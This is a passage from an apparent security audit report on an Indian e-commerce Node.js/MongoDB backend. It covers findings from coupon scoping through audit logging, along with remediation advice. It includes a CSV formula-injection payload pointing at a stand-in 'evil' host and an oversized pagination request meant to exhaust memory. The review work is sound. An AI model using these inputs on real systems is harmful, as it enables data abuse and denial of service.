An admin creates "20% off bathroom taps only", scoping it with `applicableProducts`. The field is stored and silently ignored: the discount applies to the entire cart subtotal regardless of contents. A customer applies the tap coupon to a ₹2,00,000 shower enclosure order and receives ₹40,000 off. The UI may well show the restriction, making this invisible until reconciliation.

`validateCoupon` ([`:219`](apps/server/src/controllers/remaining.controller.js#L219)) also computes its discount from a **client-supplied `orderAmount`**, so its response is advisory only — correctly, the authoritative discount comes from `calculateTotals` server-side. Worth noting because the endpoint looks authoritative and is not.

**Fix.** Either enforce the restrictions in `calculateDiscount` (computing an eligible subtotal from matching line items) or remove the fields and the admin UI that populates them. Silently-ignored business rules are worse than absent ones.

---

## M-06 — Review helpful-vote has no deduplication

**Severity: Medium** · Category 4

[`remaining.controller.js:141-149`](apps/server/src/controllers/remaining.controller.js#L141-L149)

```js
const review = await Review.findByIdAndUpdate(req.params.id, { $inc: { helpfulCount: 1 } }, { new: true });
```

No record of who voted; [`Review.js`](apps/server/src/models/Review.js) has `helpfulCount` but no `votedBy`. A single authenticated user can call the endpoint arbitrarily many times. Under the global 500-requests/2-minutes limit that is 360,000 votes/day from one account, and account creation is unrestricted.

Impact is reputational rather than financial: an attacker promotes their own review (or a competitor's negative review) to the top of a product page. Cheap to exploit, cheap to fix.

**Fix.** Add `votedBy: [ObjectId]` and use `$addToSet` with a guard, deriving `helpfulCount` from its length.

---

## M-07 — SVG accepted on upload; MIME-only validation

**Severity: Medium** · Category 6 (file uploads)

[`middleware/upload.js:9-16`](apps/server/src/middleware/upload.js#L9-L16)

```js
const allowed = ['image/jpeg', 'image/png', 'image/webp', 'image/gif', 'image/svg+xml'];
if (allowed.includes(file.mimetype)) cb(null, true);
```

`file.mimetype` is taken from the client's `Content-Type` part header — trivially forged. There is no magic-byte inspection, and no re-encoding.

**SVG is an executable document format.** An SVG containing `<script>` served from Cloudinary executes in the browser under Cloudinary's origin. Cloudinary's default delivery mitigates much of this (SVGs are typically served with `Content-Disposition: attachment` on `res.cloudinary.com`), which is why this is Medium rather than High — but the protection is a third party's default, not this application's control, and it changes if delivery is moved to a custom domain or CDN.

Because MIME is unvalidated against content, an arbitrary file (PHP, HTML, a polyglot) can be uploaded by declaring `image/png`. Upload is `roleGuard('admin','superadmin')`-restricted, which bounds this considerably.

**Fix.** Validate magic bytes (`file-type`), drop `image/svg+xml` unless there is a specific need — and if there is, sanitise with DOMPurify in SVG mode before upload. Re-encode raster images through `sharp` to strip metadata and embedded payloads.

---

## M-08 — Unbounded pagination; full-table CSV export

**Severity: Medium** · Category 5

`limit` is passed to `.limit(Number(limit))` with no ceiling at: [`order.controller.js:123`](apps/server/src/controllers/order.controller.js#L123), [`:190`](apps/server/src/controllers/order.controller.js#L190) · [`product.controller.js:16`](apps/server/src/controllers/product.controller.js#L16), [`:121`](apps/server/src/controllers/product.controller.js#L121) · [`remaining.controller.js:153`](apps/server/src/controllers/remaining.controller.js#L153) · [`notification.controller.js:19`](apps/server/src/controllers/notification.controller.js#L19) · [`activityLog.controller.js:28`](apps/server/src/controllers/activityLog.controller.js#L28) · [`shipping.controller.js:227`](apps/server/src/controllers/shipping.controller.js#L227).

`GET /api/v1/products?limit=1000000` is unauthenticated and returns every product document with populated categories in one response — a cheap memory-exhaustion and bandwidth-amplification vector, repeatable 500×/2min per IP.

[`order.controller.js:255-293`](apps/server/src/controllers/order.controller.js#L255) (`/orders/export`) applies **no limit at all** and populates user PII for every matching order. One admin request materialises the entire order history in memory and streams it as CSV.

The CSV is also injection-prone: `o.user?.name` is interpolated unescaped, so a customer registering as `=HYPERLINK("http://evil","click")` executes a formula when an admin opens the export in Excel. Only `name` is quoted (`"${...}"`), and quoting does not prevent formula evaluation.

**Fix.** Clamp `limit` to a maximum (e.g. 100) in one shared pagination helper. Stream the export with a cursor and a date-range requirement. Prefix CSV cells beginning with `= + - @` with `'`.

---

## M-09 — Rate limiting is a single global bucket

**Severity: Medium** · Category 5

[`middleware/rateLimiter.js`](apps/server/src/middleware/rateLimiter.js) defines exactly two limiters. `apiLimiter` (500/2min) applies to all `/api/`; `authLimiter` (50/2min) is applied **only** to `/register`, `/login`, `/quick-login`.

Unprotected beyond the global bucket: `POST /auth/refresh` (token grinding), `POST /payment/create-order` (each call creates a real Razorpay order and a `PendingCheckout` row — 500 per 2 minutes per IP of gateway pollution), `POST /reviews`, `POST /coupons/validate` (coupon-code brute force), and every public POST — `/enquiries/b2b`, `/service-requests`, `/bookings/*`, `/newsletter/subscribe`.

Both limiters are in-memory. Railway restarts and any horizontal scaling reset or fragment the counters.

**Fix.** Per-route limiters sized to purpose; a Redis store so limits survive restarts and apply across instances; per-account limits (not just per-IP) on authenticated abuse-prone endpoints.

---

## M-10 — `orderNumber` generation races

**Severity: Medium** · Category 8

[`Order.js:83-89`](apps/server/src/models/Order.js#L83-L89)

```js
const count = await mongoose.model('Order').countDocuments();
this.orderNumber = `OZO-${String(count + 1).padStart(6, '0')}`;
```

Read-then-write with no atomicity, on a field with a `unique` index. Two concurrent checkouts both read `count = 41` and both attempt `OZO-000042`; one gets a duplicate-key error. In `confirmAndCreateOrder` that error is caught at [`:272`](apps/server/src/controllers/payment.controller.js#L272) — but the handler assumes `11000` means "duplicate `razorpayOrderId`", looks up the winner by that key, finds nothing (the collision was on `orderNumber`), and rethrows. **The customer's payment succeeded and their order creation fails.**

`countDocuments` also decreases when orders are deleted, so numbers can be reused.

**Fix.** A dedicated counters collection with `findOneAndUpdate({_id:'order'},{$inc:{seq:1}})`, or a ULID. Also distinguish which index raised `11000` before assuming.

---

## M-11 — Duplicate `$or` disables content scheduling

**Severity: Medium** · Category 4 (correctness)

[`content.controller.js:14-27`](apps/server/src/controllers/content.controller.js#L14-L27)

```js
const content = await DynamicContent.find({
    page, isActive: true,
    $or: [ { startDate: { $exists: false } }, { startDate: null }, { startDate: { $lte: now } } ],
    $or: [ { endDate:   { $exists: false } }, { endDate: null },   { endDate:   { $gte: now } } ],
});
```

Duplicate key in an object literal — the second silently overwrites the first. Only the `endDate` condition reaches MongoDB. **`startDate` is never enforced.**

Content scheduled to go live in the future is published immediately. For a retail site this means an embargoed sale banner, campaign pricing, or an unannounced product launch appearing on the public homepage the moment it is saved. No error, no warning; the admin UI shows the schedule as configured.

**Fix.** `$and: [ { $or: [...startDate...] }, { $or: [...endDate...] } ]`. A linter with `no-dupe-keys` would have caught this — see Phase 3 CI.

---

## M-12 — Vulnerable and end-of-life dependencies

**Severity: Medium** · Category 9

`npm audit --omit=dev` in `apps/server`: **12 vulnerabilities (6 high, 6 moderate)**, excluding `axios` (client-side, not server-reachable — verified).

Server-reachable and notable:

- **`xlsx@0.18.5`** — prototype pollution (GHSA-4r6h-8v6p-xvw6) and ReDoS (GHSA-5pgg-2g8v-p4x9). **No fix available** on this package. It parses attacker-influenced files at [`bulkUpload.controller.js:19`](apps/server/src/controllers/bulkUpload.controller.js#L19). Admin-only and currently unreachable (L-02), which bounds it.
- **`multer@1.4.5-lts.2`** — the 1.x line is end-of-life; 2.x is the supported branch.
- **`mongoose@8.23.0`** — prototype pollution in update casting via `__proto__`-prefixed dotted paths. Directly relevant given H-03: 31 sites pass `req.body` into update casting.
- **`lodash`** (transitive) — code injection via `_.template`; **`path-to-regexp`** — ReDoS on multi-parameter routes; **`nodemailer`** — SMTP injection (declared but unused in server code); **`form-data`**, **`body-parser`**, **`qs`**, **`morgan`**, **`follow-redirects`** — moderate.

No `npm audit` gate in CI, because there is no CI (Phase 3).

**Fix.** Upgrade `mongoose`, `multer`→2.x, and transitives via `npm audit fix`. Replace `xlsx` with `exceljs` (maintained, no outstanding advisories). Add `npm audit --omit=dev --audit-level=high` as a CI gate.

---

## Low findings

**L-01 — Shipping controller reads non-existent Order fields.** [`shipping.controller.js:19`](apps/server/src/controllers/shipping.controller.js#L19) checks `order.orderStatus`, `:57` sends `order.totalAmount` to Shiprocket, `:80` and `:219` write `order.orderStatus`. The Order schema defines `status` and `total` — **not** `orderStatus` or `totalAmount`. So the cancelled-order guard never fires (`undefined === 'cancelled'` is false, allowing cancelled orders to be shipped), Shiprocket receives `sub_total: undefined`, and status writes land on a stray field. Mongoose silently ignores unknown paths in `findByIdAndUpdate` without `strict:false`. Fixing this is a prerequisite for C-01 being fully exploitable — sequence the fixes accordingly.

**L-02 — Bulk upload is unreachable.** [`product.routes.js:16`](apps/server/src/routes/product.routes.js#L16) applies `upload.single('excel')` using the shared multer instance, whose `fileFilter` allows only image MIME types. An `.xlsx` upload (`application/vnd.openxmlformats-...`) is rejected with "Only JPEG, PNG, WebP, GIF, and SVG files are allowed." The feature cannot have been exercised since the filter was added. Needs a separate multer instance — and that will make M-12's `xlsx` exposure live, so fix in that order.

**L-03 — Dead `accessToken` cookie branch.** [`middleware/auth.js:11`](apps/server/src/middleware/auth.js#L11) reads `req.cookies?.accessToken`, but grep confirms nothing ever sets that cookie — only `refreshToken` is set. Harmless today; misleading, and it implies a cookie-auth mode that doesn't exist.

**L-04 — JWT lifetime mismatch.** [`env.js:135`](apps/server/src/config/env.js#L135) defaults `JWT_ACCESS_EXPIRES_IN` to `'1d'`; `.env.example:17` documents `15m`. If the deployed environment omits the variable, access tokens live 96× longer than intended — and with no revocation (M-01), a stolen token is valid for a full day.

**L-05 — Newsletter unsubscribe is unauthenticated and partly dead.** [`remaining.controller.js:435`](apps/server/src/controllers/remaining.controller.js#L435) unsubscribes by email with no ownership proof, so anyone can unsubscribe any address. The `token` branch queries `unsubscribeToken`, a field that **does not exist** on [`Newsletter.js`](apps/server/src/models/Newsletter.js) — so token-based unsubscribe silently matches nothing. Compounded by H-06 for mass unsubscribe.

**L-06 — Health endpoint discloses environment.** [`app.js:67-74`](apps/server/src/app.js#L67) returns `environment: env.NODE_ENV` unauthenticated. Minor reconnaissance value; confirms a misconfigured non-production deployment if one is exposed.

**L-07 — Audit trail does not cover money or permissions.** `logActivity` ([`activityLog.controller.js:10`](apps/server/src/controllers/activityLog.controller.js#L10)) is called at exactly four sites: product create/update/delete and order status update. **Not logged:** refunds (C-02), admin user creation/deletion/role changes, coupon creation and modification, payment confirmations, order cancellations, or logins. For a system handling payments this is inadequate for both incident response and dispute resolution — after a compromise there would be no record of what an attacker did with the money. `ipAddress` is captured but no alerting exists on any event.

---

## What is genuinely fine

Stated explicitly so remediation does not disturb working controls:

- **Password hashing** — bcrypt cost 12 via a correct `pre('save')` hook that checks `isModified`. [`User.js:45-49`](apps/server/src/models/User.js#L45)
- **Credential stripping** — `toJSON` removes `password`, `refreshToken`, and reset fields. [`User.js:57-64`](apps/server/src/models/User.js#L57)
- **Boot-time config validation** — rejects missing vars always; in production additionally rejects secrets under 32 chars, placeholder values from `.env.example`, identical access/refresh secrets, and missing CORS origins. [`env.js:11-68`](apps/server/src/config/env.js#L11) Better than most production codebases.
- **`trust proxy: 1`** — exactly one hop, not `true`, with a comment explaining that `true` would let clients spoof `X-Forwarded-For` and bypass the login limiter. [`app.js:26-28`](apps/server/src/app.js#L26)
- **Razorpay signature verification** — HMAC-SHA256 with `timingSafeEqual` and a length pre-check to avoid the `Buffer.from` length mismatch throw. [`payment.controller.js:129-145`](apps/server/src/controllers/payment.controller.js#L129)
- **Server-side amount reconciliation** — `rzp.orders.fetch` compared against the snapshot total before the order is created. [`:190-201`](apps/server/src/controllers/payment.controller.js#L190) The strongest control in the codebase. Note the limit established in the prior session: both sides derive from the same quote, so it detects tampering *between* quote and capture, not a total that was wrong at quote time.
- **`PendingCheckout` snapshot with TTL** — freezes the priced cart so mid-payment cart edits cannot change what is charged or recorded. Well designed and well documented. [`PendingCheckout.js`](apps/server/src/models/PendingCheckout.js)
- **Order idempotency** — unique sparse index on `razorpayOrderId`, with correct duplicate-key race handling that returns the winning order rather than failing. [`Order.js:99`](apps/server/src/models/Order.js#L99), [`payment.controller.js:272-284`](apps/server/src/controllers/payment.controller.js#L272)
- **Atomic coupon claim** — `findOneAndUpdate` with an `$expr` usage-limit guard and rollback on per-user-limit failure. [`order.controller.js:40-60`](apps/server/src/controllers/order.controller.js#L40)
- **Integer rupee arithmetic** — no float accumulation in `calculateTotals`; rounding is explicit and applied once.
- **Role escalation is blocked** — `register` hardcodes `role:'customer'`, `createAdminUser` rejects non-`admin` roles, `updateProfile` explicitly destructures. The highest-value mass-assignment target is correctly defended.
- **Ownership checks where present are correct** — `{_id, user}` scoping in orders, notifications, cart and wishlist. H-01 is a single omission, not a pattern.
- **No secrets in git** — verified across all branches and full history; only `.env.example` with placeholders is tracked.
- **Error handling** — stack traces gated on `NODE_ENV === 'development'`; 500s always logged. [`errorHandler.js`](apps/server/src/middleware/errorHandler.js)
- **`helmet()` enabled** with defaults. [`app.js:31`](apps/server/src/app.js#L31)
- **Quantity integrity** — closed in the preceding session (`validateQuantity.js`, `stock.js`, `calculateTotals` guard), with 20 regression tests verified to fail on the pre-fix code.

---

## Systemic recommendations

Four central mechanisms would close most findings at once, and are proposed instead of patching each call site:

1. **Ownership guard** — `requireOwnership(Model, paramName)` middleware resolving the document scoped to `req.user._id` and attaching it to `req`. Closes H-01, prevents recurrence. Applied deny-by-default so a new `:id` route is protected unless it opts out.
2. **Validated DTO layer** — per-route schemas at the boundary, replacing raw `req.body`. Closes H-03, H-06, H-02, most of M-05, and the unvalidated inputs behind C-02, C-03, M-04. This is the single highest-leverage change.
3. **Response serializers** — explicit per-resource projections; no Mongoose document is returned raw. Closes H-09 and the general excessive-exposure class.
4. **Order state machine + money ledger** — one module owning legal status transitions and one owning payment/refund records. Closes C-03, C-02's tracking gap, M-04, and gives L-07 something meaningful to log.

---

## What I could not verify statically

These need runtime, DAST, or manual pentest confirmation:

1. **Whether Shiprocket's webhook (C-01) is currently registered** and receiving live traffic — and whether Shiprocket offers signature verification on this account's plan. Determines urgency and the fix shape.
2. **Whether Razorpay rejects over-capture refunds (C-02)** in this account's configuration, and whether partial refunds accumulate as assumed. Needs a sandbox test.
3. **Actual `NODE_ENV`, `JWT_ACCESS_EXPIRES_IN`, `CLIENT_URL`, `ADMIN_URL` in production.** L-04's severity and H-08's blast radius both depend on deployed values, which are in Railway, not the repo.
4. **Cloudinary's delivery headers for SVG (M-07)** on this account — whether `Content-Disposition: attachment` is applied. Decides whether M-07 is Medium or High.
5. **Whether the MongoDB deployment is a replica set** — required for the transactions in H-07. Atlas yes, standalone no.
6. **MongoDB user privileges** — whether the application connects with a least-privilege role or as an admin. Not derivable from `MONGODB_URI` in code.
7. **TLS configuration, HSTS, and whether Nginx/Railway terminates TLS correctly**, plus whether `secure` cookies actually transmit.
8. **Real exploitability of NoSQL injection (H-06)** against the live database, particularly ReDoS timing on production data volumes.
9. **Whether the admin SPA renders review HTML unescaped (H-02).** I read the server; confirming the XSS sink requires reviewing `ReviewsView.vue` and the storefront product page, and ideally a live payload test.
10. **Backup posture, retention, encryption at rest, and restore testing** — no infrastructure-as-code in the repo.
11. **Whether `/orders/export` CSV injection triggers** in the spreadsheet software the client actually uses.
12. **Concurrency behaviour under real load** — H-07's race windows and M-10's `orderNumber` collision need load testing to characterise; both are certain in principle but their frequency is environment-dependent.
